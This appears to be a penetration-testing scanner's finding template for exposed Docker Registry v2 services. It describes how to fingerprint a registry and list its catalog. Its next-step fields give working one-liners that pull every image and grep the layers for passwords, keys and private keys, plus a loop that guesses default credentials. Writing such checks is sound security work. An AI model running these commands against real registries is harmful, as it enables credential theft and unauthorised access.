summary: Minimal but correct: fingerprints /v2/ via Docker-Distribution-Api-Version header, lists /v2/_catalog if anonymous read succeeds, or emits an info finding when auth is required. No image pull, no layer scan, no default-cred / brute-force against docker login.

findings.title_pattern: Docker Registry v2 catalog readable without auth
findings.tier_evidence: Anon /v2/_catalog returning 200 with a repositories list is deterministic proof of unauth read.
findings.promotion_notes: Pull each repository's manifest (/v2/<repo>/manifests/latest), fetch each layer blob, extract layer tarball, grep for embedded credentials (docker-compose env, embedded .aws, .kube, .env files, private keys). Fully unauthenticated. Wire secrets into known_creds.
findings.tester_next_step: curl -sk http://<ip>:5000/v2/_catalog?n=1000; for r in <repos>; do docker pull <ip>:5000/$r:latest; docker save <ip>:5000/$r:latest | tar -xO | grep -Ei 'password|api_key|BEGIN.*PRIVATE'; done

findings.tier_evidence: 401 with Bearer challenge — fingerprint only, no vuln.
findings.promotion_notes: Try seeded creds (admin:admin, registry:registry, harbor:Harbor12345 for Harbor) against docker login, or hit /v2/token endpoint with basic auth guesses.
findings.tester_next_step: for pw in admin registry password Harbor12345; do curl -sku admin:$pw http://<ip>:5000/v2/_catalog && echo pwned:$pw; done
